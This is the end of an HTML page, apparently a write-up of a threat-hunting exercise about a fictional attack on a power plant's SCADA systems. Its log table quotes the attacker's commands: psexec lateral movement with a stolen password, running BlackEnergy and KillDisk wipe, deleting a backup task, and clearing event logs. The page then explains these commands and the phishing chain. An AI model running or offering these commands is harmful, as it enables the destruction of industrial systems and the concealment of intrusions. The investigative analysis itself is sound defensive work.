+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "copy C:\\malware\\BlackEnergy.exe \\%i\\SCADA\\BlackEnergy.exe")</td>
+                    <td>cmd.exe</td>
+                    <td>d21027cfcbd6aad25f8c547149d9a9a8471405d5e5c93d576b0dfd81114d36f3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:08:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\BlackEnergy.exe &amp;&amp; \\%i\\ProgramData\\SCADA_Malicious_Commands.txt")</td>
+                    <td>cmd.exe</td>
+                    <td>4ab11d499060aa39d7d5e21fad3f072b3781ca13d3fff400c797a09dc00ff889</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 04:41:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>for /F 'tokens=1' %i in (C:\\ProgramData\\SCADA_IPs.txt) do ( set /p password=&lt;C:\\ProgramData\\Extracted_Password.txt psexec.exe \\%i -u administrator -p %password% cmd /c "\\%i\\SCADA\\KillDisk.exe --all --wipe")</td>
+                    <td>cmd.exe</td>
+                    <td>80271c9ee2c2c346780b79fafe36ae1067cd360381130a950cc36ff37f22dd7e</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 05:00:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>schtasks /delete /tn 'BackupTask' /f</td>
+                    <td>cmd.exe</td>
+                    <td>b81dd8ce410d7b13dcae8b0229a7164373fb8b699ba802161d957377cce41b47</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 05:25:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wevtutil cl Application</td>
+                    <td>cmd.exe</td>
+                    <td>d1b08ecbcfae64e682745b2b87f7909cc99b865098c52fe1dc619af923236ec3</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 05:32:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wevtutil cl System</td>
+                    <td>cmd.exe</td>
+                    <td>bf9521b7610e06b72b38ea9421c4668a86f2df4f18339ca3a0d504ab1fd1a3b4</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                  <tr>
+                    <td>2024-09-10 05:41:57.0000</td>
+                    <td>cmd.exe</td>
+                    <td>614ca7b627533e22aa3e5c3594605dc6fe6f000b0cc2b845ece47ca60673ec7f</td>
+                    <td>wevtutil cl Security</td>
+                    <td>cmd.exe</td>
+                    <td>081110ba8cbd91f3f165159adbe762cb7828ce5aa6d256bef82cff3a2a4ab8c7</td>
+                    <td>BDC0-DESKTOP</td>
+                    <td>jisaetang</td>
+                  </tr>
+                </tbody>
+              </table>
+            </div>
+          </details>
+          <p>Besides the things I already reported previously (see <a href="#results2">[2]</a>), there are a few previously-unseen commands.</p>
+          <ul>
+            <li><samp>nltest /dclist</samp>: <quote>[It can be used to] [g]et a list of domain controllers [...] <samp>/dclist:[ &lt;DomainName>]</samp> [l]ists all domain controllers in the domain.</quote> [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11)">Microsoft Learn</a>]</li>
+            <li><samp>wevtutil cl</samp>: "Enables you to retrieve information about event logs and publishers. You can also use this command to install and uninstall event manifests, to run queries, and to export, archive, and clear logs." The <samp>cl</samp> (clear log) option is quite self-explainatory; the threat actor deleted system, application and security logs. [<a href="https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc731935(v=ws.11)">Microsoft Learn</a>]</li>
+            <li><samp>schtasks /delete /tn 'BackupTask' /f</samp>: <samp>schtasks</samp> is used to manage scheduled tasks on a system, being able to add, remove and change them. The <samp>/delete</samp> switch deletes the task specified with <samp>/tn</samp> (task name), and <samp>/f</samp> (force) executes the command without any warning prompts. [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks">Microsoft Learn (schtasks)</a>] [<a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-delete">Microsoft Learn (schtasks delete)</a>]</li>
+          </ul>
+          <p>There don't seem to be any other activity from the threat actor after the last command executed on SCADA Operator Jibby Saetang's device.</p>
+          <p>Doing a brief check against the <samp>SecurityAlerts</samp> table shows that none of the emails or files were reported or automatically flagged as suspicious, with the exception of user <samp>dasiegel</samp> (IT Administrator David Siegel) reporting an email with the subject line <samp>[EXTERNAL] Critical: Severe Security Breach Detected - Immediate Action Required</samp> as suspicious on 2024-09-04 at 10:39:46 in the morning. He was also among the few that weren't compromised by the false login page.</p>
+          <p>The threat actors exploited growing concerns about vulnerabilities in critical infrastructure to gain a foothold and do devastating damage; after they successfully compromised the accounts of two of Jibby's trusted colleagues, they sent him urgent emails about cyberattacks and vulnerabilities with a malicious zip file; when opened, it extracted and executed the <samp>blackenergy.exe</samp> malware, which ensured a persistent connection to its C2 server, downloaded other tools to gather information and spread itself throughout the network, and finally wiped the SCADA systems; the threat actors then disabled the power plant's backup scheduled task and cleared the logs in an attempt to mask their actions.</p>
+        </section> <!--section 2-->
+      </article> <!--game sections-->
+      <a class="skip" href="#page-navigation">Return to page navigation</a>
+    </main><!--main page content-->
+  </body>
+</html>
